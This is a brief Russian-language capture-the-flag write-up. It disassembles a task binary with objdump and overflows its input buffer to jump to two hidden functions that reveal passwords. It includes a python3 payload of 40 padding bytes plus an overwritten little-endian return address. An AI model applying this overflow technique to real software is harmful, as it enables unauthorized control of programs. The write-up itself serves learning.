# Writeup

Получаем два бинарных файла: "RCD_765" и второй, с логикой таска.

Работаем сразу с первым.

Используем команду: `objdump -d ./RCD_765` для дизассемблирования секций бинарного флага. 

Находим две функции: non_interesting_stuff и its_not_interesting, в которых спрятаны полезные строки (намёк на пароли). В коде они не вызываются явно, поэтому нам нужно вручную передать управление этим функциям через уязвимость.


`objdump -d ./RCD_765 | grep interesting`

Наша цель - это запустить по очереди обе функции. Но в коде они нигде не вызываются, при запуске самого бинарного файла как обычно - ничего не происходит. Код ждёт ввода. 

Вручную подбираем смещение. В нашем случае, исполнение программы валится уже на 40 байтах пейлоада + адрес возврата:

```python
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*40 + # trash
    b"\xaf\x24\x40\x00\x00\x00\x00\x00" # return address
)' | ./RCD_765
```

Адрес возврата записывается в little-endian, от младших байт к старшим.

Проделав подобную операцию дважды, для обеих функций, мы получаем пароль. Пропускаем первый уязвимый ввод, запрашивающий "персональный номер", вводим пароли в следующие поля ввода. 

В конце видим лог данных с устройства. Среди них - необходимая для дальнейшего прохождения информация. Её мы вводим в основной бинарный файл.

Основной бинарный файл не представляет собой никаких технических вызовов: он только читает строку ввода и выводит повествование. В конце - получаем флаг.
